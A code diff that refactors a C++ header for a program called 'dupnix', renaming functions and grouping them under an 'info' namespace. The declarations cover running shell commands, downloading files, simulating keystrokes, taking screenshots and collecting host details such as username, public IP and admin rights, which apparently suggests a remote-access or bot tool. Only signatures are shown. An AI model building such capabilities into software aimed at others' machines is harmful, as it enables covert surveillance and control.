@@ -16,32 +16,35 @@
 
 namespace tools {
 	// do something
-	std::string cmd_output(const char* cmd);
-	bool filexists(const std::string& name);
-	std::string random_string(int lenght);
+	std::string randomString(int lenght);
 	int ChangeVolume(double nVolume = -1, bool bScalar = 0);
-	nlohmann::json load_cfg();
-	void change_cfg(nlohmann::json change);
+	void changeCfg(nlohmann::json change);
 	void press_key(char a, bool is_bigone = 0);
 	bool DownloadFile(std::string link, std::string path);
 	std::string toLowerCase(std::string s);
 	void pressSpecialKey(BYTE key, bool up);
+	bool remove(const std::string& to_remove);
 
 	// get info
-	char GetSysDiskLetter();
-	std::string get_username();
-	std::string get_exe();
-	std::string hostname();
-	std::string public_ip();
-	std::string admin_rights();
-	std::string Cursor_Position();
-	std::string get_path();
-	std::string uptime();
-	std::string DiskList();
-	std::vector<std::pair<std::string, std::string>> getLocalIp();
-	bool is_path(const std::string& path);
-	bool remove(const std::string& to_remove);
+	namespace info {
+		nlohmann::json loadCfg();
+		char getSysDiskLetter();
+		std::string getUsername();
+		std::string getExeName();
+		std::string getHostname();
+		std::string getPublicIp();
+		bool checkAdminRights();  // to check if dupnix has admin rights
+		std::string getCursorPos(); 
+		std::string getDupnixPath(); 
+		std::string getUptime();
+		std::string DiskList(); 
+		std::vector<std::pair<std::string, std::string>> getLocalIp();
+		bool isPath(const std::string& path);
+		std::string cmdOutput(const char* cmd); 
+		bool filExists(const std::string& name);
+	}  //namespace info
 
 	// for screenshot function
 	cv::Mat captureScreenMat(HWND hwnd);
 }  // namespace tools
+BITMAPINFOHEADER createBitmapHeader(int width, int height);
